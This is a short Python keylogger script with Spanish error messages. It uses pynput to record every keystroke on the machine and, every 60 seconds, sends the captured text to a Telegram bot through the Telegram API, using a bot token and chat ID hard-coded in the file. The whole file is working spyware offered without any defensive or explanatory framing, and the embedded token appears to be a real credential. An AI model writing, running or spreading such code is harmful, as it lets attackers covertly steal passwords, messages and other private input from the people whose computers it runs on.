#!/usr/bin/env python3

import pynput.keyboard
import threading 
import requests
log = ""
TOKEN="7693769656:AAGvxNDtRvwipX7yHFyUsqc_AtZaoqS_OhE"
CHAT_ID="7796337180"

def send_telegram(msg):
    url=f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data={"chat_id": CHAT_ID, "text": msg}

    try:
        requests.post(url, data=data)
    except requests.exeptions.RequestException as e:
        print(f"[Error al enviar el mensaje: {e}]")
def pressed_key(key):
    
    global log
    try:
        log  += str(key.char)
    except AttributeError:
        special_keys={key.space: " ", key.backspace: " ", key.enter: "\n", key.shift:" ", key.ctrl:" ", key.alt:" "}
        log += special_keys.get(key, f" {str(key)} ")
    print(log)

def reporte():
    global log
    if log:
        send_telegram(log)
        log=""
    timer = threading.Timer(60, reporte)
    timer.start()



keyboard_listener = pynput.keyboard.Listener(on_press=pressed_key)

with keyboard_listener:
    reporte()
    keyboard_listener.join()
